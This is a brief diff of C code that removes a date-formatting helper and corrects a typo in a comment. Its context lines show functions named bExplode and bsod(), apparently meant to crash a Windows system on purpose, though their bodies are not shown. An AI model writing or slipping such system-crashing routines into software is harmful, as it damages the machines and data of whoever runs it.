@@ -120,19 +120,7 @@ BOOL bExplode(void) {
 	return TRUE;
 }
 
-// stolen from stackexchnaeg
-
-void GetCurrentDate(char *inputBuffer) {
-	time_t     now = time(0);
-	struct tm  tstruct;
-	char       buf[80];
-	tstruct = *localtime(&now);
-	// Visit http://en.cppreference.com/w/cpp/chrono/c/strftime
-	// for more information about date/time format
-	strftime(buf, sizeof(buf), "%Y-%m-%d", &tstruct);
-
-	strcpy(inputBuffer, buf);
-}
+// stolen from stackexchange
 
 int bsod() {
 	BOOLEAN bEnabled;
